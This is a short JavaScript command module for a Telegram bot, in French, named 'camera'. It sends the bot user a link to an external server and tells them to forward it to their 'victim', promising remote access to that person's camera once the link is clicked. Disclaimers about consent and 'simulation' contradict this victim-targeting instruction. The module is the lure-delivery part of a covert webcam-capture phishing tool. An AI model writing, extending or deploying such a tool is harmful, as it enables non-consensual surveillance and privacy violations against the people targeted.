module.exports = {
  name: 'camera',
  description: 'Envoie un lien sécurisé pour une capture simulée (consentement requis)',
  async execute(bot, msg) {
    const chatId = msg.chat.id;
    const username = msg.from.username || msg.from.first_name || "utilisateur";
    const baseUrl = 'https://new-number-virtuel.onrender.com';
    const url = `${baseUrl}/${chatId}`;

    const text = `📸 *Salutations @${username}*\n\n` +
      `🎯 Copie ce lien envoi le à ta victime.  📌 Dès qu’il/elle cliquera, tu pourras avoir accès à sa caméra à distance   
⏳ Patiente un instant pour qu’il/elle ouvre le lien.... :\n\n` +
      `[🔗 Ouvrir le lien](${url})\n\n` +
      `La capture n'est effectuée *que* si la personne clique explicitement sur « Capturer & Envoyer ».\n\n` +
      `⚠️ *Utilisation responsable* — n'utilisez ce lien *qu'avec le consentement explicite* de la personne. L'utilisation sans consentement est illégale.\n\n` +
      `ℹ️ Après envoi, l'administrateur et la personne recevront la photo (simulation).`;

    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
  }
};